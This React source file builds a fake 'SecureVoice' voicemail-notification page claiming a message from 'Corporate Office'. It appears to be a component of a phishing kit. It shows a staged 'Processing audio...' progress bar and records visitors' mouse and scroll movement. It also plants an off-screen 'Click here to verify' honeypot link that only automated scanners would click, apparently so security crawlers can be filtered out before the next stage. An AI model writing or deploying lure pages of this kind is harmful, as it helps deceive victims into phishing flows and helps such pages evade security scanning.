'use client'

import { useState, useEffect } from 'react'

interface LoadingScreenProps {
  duration: number
  language: string
  onComplete: () => void
  onBehaviorTracked: (data: any) => void
  onHoneypotTriggered: () => void
}

interface Translations {
  title: string
  subtitle: string
  newMessage: string
  from: string
  duration: string
  received: string
  processing: string
  footer: string
}

export default function VoiceMessageScreen({
  duration,
  language,
  onComplete,
  onBehaviorTracked,
  onHoneypotTriggered
}: LoadingScreenProps) {
  const [progress, setProgress] = useState(0)
  const [waveAnimation, setWaveAnimation] = useState(0)
  const [translations, setTranslations] = useState<Translations | null>(null)

  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'voiceMessage' })
        })
        const data = await response.json()
        setTranslations(data.translations)
      } catch (error) {
        setTranslations({
          title: 'SecureVoice',
          subtitle: 'Encrypted Messaging',
          newMessage: 'New Voice Message',
          from: 'From',
          duration: 'Duration',
          received: 'Received',
          processing: 'Processing audio...',
          footer: 'Encrypted · Secure'
        })
      }
    }
    fetchTranslations()
  }, [])

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval)
          onComplete()
          return 100
        }
        return prev + (100 / (duration * 10))
      })
    }, 100)

    const waveInterval = setInterval(() => {
      setWaveAnimation(prev => (prev + 1) % 5)
    }, 150)

    const trackMouse = (e: MouseEvent) => onBehaviorTracked({ type: 'mouse', x: e.clientX, y: e.clientY })
    const trackScroll = () => onBehaviorTracked({ type: 'scroll', y: window.scrollY })
    window.addEventListener('mousemove', trackMouse)
    window.addEventListener('scroll', trackScroll)

    const honeypot = document.createElement('a')
    honeypot.href = '#'
    honeypot.style.position = 'absolute'
    honeypot.style.left = '-9999px'
    honeypot.textContent = 'Click here to verify'
    honeypot.addEventListener('click', (e) => {
      e.preventDefault()
      onHoneypotTriggered()
    })
    document.body.appendChild(honeypot)

    return () => {
      clearInterval(interval)
      clearInterval(waveInterval)
      window.removeEventListener('mousemove', trackMouse)
      window.removeEventListener('scroll', trackScroll)
      honeypot.remove()
    }
  }, [duration, onComplete, onBehaviorTracked, onHoneypotTriggered])

  if (!translations) {
    return (
      <div style={{ minHeight: '100vh', background: 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ width: '40px', height: '40px', border: '4px solid rgba(255,255,255,0.3)', borderTop: '4px solid white', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    )
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <div style={{
        background: 'white',
        borderRadius: '24px',
        boxShadow: '0 30px 80px rgba(0,0,0,0.3)',
        padding: '60px 50px',
        maxWidth: '500px',
        width: '100%',
        animation: 'slideUp 0.5s ease-out'
      }}>
        {/* Microphone Icon with Wave Animation */}
        <div style={{
          width: '140px',
          height: '140px',
          margin: '0 auto 35px',
          position: 'relative'
        }}>
          <div style={{
            width: '100%',
            height: '100%',
            background: 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)',
            borderRadius: '50%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '70px',
            boxShadow: '0 15px 40px rgba(240, 147, 251, 0.4)',
            animation: 'pulse 2s ease-in-out infinite'
          }}>
            🎤
          </div>
          
          {/* Sound Wave Bars */}
          <div style={{
            position: 'absolute',
            bottom: '-25px',
            left: '50%',
            transform: 'translateX(-50%)',
            display: 'flex',
            gap: '6px',
            alignItems: 'flex-end'
          }}>
            {[0, 1, 2, 3, 4].map(i => (
              <div
                key={i}
                style={{
                  width: '5px',
                  height: waveAnimation === i ? '20px' : '8px',
                  background: 'linear-gradient(180deg, #f093fb 0%, #f5576c 100%)',
                  borderRadius: '3px',
                  transition: 'height 0.15s ease',
                  boxShadow: '0 2px 8px rgba(240, 147, 251, 0.4)'
                }}
              />
            ))}
          </div>
        </div>

        {/* Title */}
        <h1 style={{
          fontSize: '26px',
          fontWeight: '700',
          color: '#1a202c',
          marginBottom: '10px',
          textAlign: 'center'
        }}>
          {translations.newMessage}
        </h1>

        {/* Message Info */}
        <div style={{
          background: 'linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%)',
          borderRadius: '16px',
          padding: '25px',
          marginBottom: '30px',
          border: '1px solid #e2e8f0'
        }}>
          {[
            { label: translations.from, value: 'Corporate Office' },
            { label: translations.duration, value: '2:34' },
            { label: translations.received, value: 'Just now' }
          ].map((item, i) => (
            <div
              key={i}
              style={{
                display: 'flex',
                justifyContent: 'space-between',
                padding: '12px 0',
                borderBottom: i < 2 ? '1px solid #e2e8f0' : 'none'
              }}
            >
              <span style={{ fontSize: '14px', color: '#718096' }}>{item.label}</span>
              <span style={{ fontSize: '14px', fontWeight: '600', color: '#2d3748' }}>{item.value}</span>
            </div>
          ))}
        </div>

        {/* Progress Bar with Shimmer */}
        <div style={{
          width: '100%',
          height: '8px',
          background: 'linear-gradient(90deg, #e2e8f0 0%, #cbd5e0 100%)',
          borderRadius: '10px',
          overflow: 'hidden',
          marginBottom: '15px',
          boxShadow: 'inset 0 2px 4px rgba(0,0,0,0.1)'
        }}>
          <div style={{
            width: `${progress}%`,
            height: '100%',
            background: 'linear-gradient(90deg, #f093fb 0%, #f5576c 100%)',
            transition: 'width 0.3s ease',
            position: 'relative',
            boxShadow: '0 0 10px rgba(240, 147, 251, 0.6)'
          }}>
            <div style={{
              position: 'absolute',
              top: 0,
              left: '-100%',
              width: '100%',
              height: '100%',
              background: 'linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent)',
              animation: 'shimmer 1.5s infinite'
            }} />
          </div>
        </div>

        {/* Status */}
        <p style={{
          textAlign: 'center',
          color: '#718096',
          fontSize: '15px',
          fontWeight: '500',
          marginBottom: '20px'
        }}>
          {translations.processing}
        </p>

        {/* Footer */}
        <div style={{
          textAlign: 'center',
          paddingTop: '20px',
          borderTop: '1px solid #e2e8f0'
        }}>
          <span style={{
            fontSize: '13px',
            color: '#a0aec0',
            display: 'inline-flex',
            alignItems: 'center',
            gap: '6px'
          }}>
            🔐 {translations.footer}
          </span>
        </div>
      </div>

      <style>{`
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shimmer { to { left: 100%; } }
      `}</style>
    </div>
  )
}
